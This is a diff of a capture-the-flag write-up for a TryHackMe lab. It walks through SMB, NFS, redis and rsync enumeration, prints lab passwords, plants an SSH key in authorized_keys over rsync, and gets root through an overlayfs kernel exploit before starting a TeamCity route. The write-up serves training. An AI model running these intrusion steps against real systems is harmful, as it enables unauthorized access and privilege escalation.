@@ -1,6 +1,6 @@
-##VulnNet: Internal
+## VulnNet: Internal
 
-#Enumeration
+# Enumeration
 ```
 # Nmap 7.91 scan initiated Fri May  7 14:20:53 2021 as: nmap -sCV -oN nmap/initial -vvv -p 22,111,139,445,873,2049,6379,39931,43095,44453,45199 10.10.72.124
 Nmap scan report for 10.10.72.124
@@ -94,10 +94,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Fri May  7 14:21:17 2021 -- 1 IP address (1 host up) scanned in 23.88 seconds
 ```
 
-#Enumerating SMB
+# Enumerating SMB
 ```
-┌──(root💀kali)-[~/CTFS/vulnNetInternal]
-└─# smbmap -H 10.10.72.124
+# smbmap -H 10.10.72.124
 [+] Guest session       IP: 10.10.72.124:445    Name: 10.10.72.124
         Disk                                                    Permissions     Comment
         ----                                                    -----------     -------
@@ -135,23 +134,20 @@ smb: \data\> ls
                 11309648 blocks of size 1024. 3279220 blocks available
 
 
-┌──(root💀kali)-[~/CTFS/vulnNetInternal]
-└─# cat services.txt
+# cat services.txt
 REDACTED
 
-┌──(root💀kali)-[~/CTFS/vulnNetInternal]
-└─# cat data.txt
+# cat data.txt
 Purge regularly data that is not needed anymore
 
-┌──(root💀kali)-[~/CTFS/vulnNetInternal]
-└─# cat business-req.txt
+# cat business-req.txt
 We just wanted to remind you that we’re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed.
 If you have any questions, please text or phone us.
 ```
 
 We find the services flag in services.txt and some notes that maybe will give us a hint later
 
-#Enumerating NFS
+# Enumerating NFS
 ```
 ┌──(root💀kali)-[~/CTFS/vulnNetInternal]
 └─# showmount -e 10.10.72.124
@@ -164,15 +160,15 @@ Export list for 10.10.72.124:
 ┌──(root💀kali)-[~/CTFS/vulnNetInternal]
 └─# mount -t nfs 10.10.72.124:/opt/conf mount
 ```
-There are a few directories here for various services and their config files, but the standout is in the redis config file in which the following line is commented out
 
+There are a few directories here for various services and their config files, but the standout is in the redis config file in which the following line is commented out
 ```
 # requirepass REDACTED
 ```
 
 So we likely have a redis password now so lets try and enumerate that next.
 
-#Enumerating redis
+# Enumerating redis
 ```
 ┌──(root💀kali)-[~/CTFS/vulnNetInternal]
 └─# redis-cli -h 10.10.72.124 -a 'B65Hx562F@ggAZ@F'
@@ -193,27 +189,22 @@ list
 ```
 
 We also checked the other keys but of interest was the internal flag and the authlist which gave us some base64 to decode and receive a rsync password from
-Hcg3HP67@TW@Bc72v
 
-#Enumerating rsync
+# Enumerating rsync
 ```
-┌──(root💀kali)-[~/CTFS/vulnNetInternal]
-└─# rsync -av --list-only rsync://10.10.72.124:873
+# rsync -av --list-only rsync://10.10.72.124:873
 files           Necessary home interaction
 
-┌──(root💀kali)-[~/CTFS/vulnNetInternal]
-└─# mkdir rsync
+# mkdir rsync
 
-┌──(root💀kali)-[~/CTFS/vulnNetInternal]
-└─# rsync -av rsync://rsync-connect@10.10.72.124:873/files ./rsync
+# rsync -av rsync://rsync-connect@10.10.72.124:873/files ./rsync
 Password:
 receiving incremental file list
 ```
 
 This copies all the files onto our system for us to examine. We find a the username sys-internal and the user.txt flag. After unsuccessfully looking for exposed credentials to actually establish a foothold. We decide to upload our ssh-public key and ssh into the box that way
 ```
-┌──(root💀kali)-[~/CTFS/vulnNetInternal]
-└─# rsync -ahv /root/.ssh/id_rsa.pub rsync://rsync-connect@10.10.72.124:873/files/sys-internal/.ssh/authorized_keys --inplace --no-o --no-g
+# rsync -ahv /root/.ssh/id_rsa.pub rsync://rsync-connect@10.10.72.124:873/files/sys-internal/.ssh/authorized_keys --inplace --no-o --no-g
 Password:
 sending incremental file list
 id_rsa.pub
@@ -221,8 +212,7 @@ id_rsa.pub
 sent 657 bytes  received 35 bytes  125.82 bytes/sec
 total size is 563  speedup is 0.81
 
-┌──(root💀kali)-[~/CTFS/vulnNetInternal]
-└─# ssh -i /root/.ssh/id_rsa sys-internal@10.10.72.124
+# ssh -i /root/.ssh/id_rsa sys-internal@10.10.72.124
 The authenticity of host '10.10.72.124 (10.10.72.124)' can't be established.
 ECDSA key fingerprint is SHA256:0ysriVjo72WRJI6UecJ9s8z6QHPNngSiMUKWFTO6Vr4.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
@@ -254,8 +244,8 @@ applicable law.
 sys-internal@vulnnet-internal:~$
 ```
 
-#Privilege Escalation
-So in recently another room, https://tryhackme.com/room/overlayfs, describes a Ubuntu kernel exploit present on Ubuntu 18.04 servers. 
+# Privilege Escalation
+Recently in another room, https://tryhackme.com/room/overlayfs, a Ubuntu kernel exploit present on Ubuntu 18.04 servers is described. 
 ```
 sys-internal@vulnnet-internal:~$ cd /tmp
 sys-internal@vulnnet-internal:/tmp$ which gcc
@@ -291,9 +281,9 @@ lrwxrwxrwx  1 root root    9 Feb  2 15:14 .rediscli_history -> /dev/null
 drwx------  4 root root 4096 Feb  6 12:59 .thumbnails
 ```
 
-And as simple as the at we have a root shell, I find it hard to believe this was the intended method of privilege escalation as the CVE for this exploit is fairly reason and outside the domain of services which the room has been exploring. So lets explore the services on the system and see if we can find the more intended privilege esclation method.
+And as simple as the at we have a root shell, I find it hard to believe this was the intended method of privilege escalation as the CVE for this exploit is fairly recent at the time of this writing and outside the domain of services which the room has been exploring. So lets explore the services on the system and see if we can find the more intended privilege esclation method.
 
-#Intended Privilege Escalation/TeamCity service
+# Intended Privilege Escalation/TeamCity service
 Ultimately after a bit of searching, if we upload linpeas it's not too hard to find, we find the TeamCity service running locally as root on port 8111 along with some possible authentication tokens in /TeamCity/logs/catalina.out. So first we put set up a port forward 
 
 ```
